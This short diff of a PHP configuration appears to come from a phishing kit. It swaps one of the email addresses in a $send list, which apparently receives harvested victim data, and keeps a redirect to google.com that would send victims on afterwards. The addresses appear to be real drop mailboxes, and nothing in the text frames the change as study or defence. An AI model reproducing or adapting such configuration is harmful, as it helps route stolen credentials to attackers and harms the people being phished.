@@ -1,6 +1,6 @@
 <?php
 
-$send="jkraniun@gmail.com,logz4ever@yandex.com";
+$send="jkraniun@gmail.com,gayoragallagher@yandex.com";
 $redirect="https://www.google.com/";
 
 
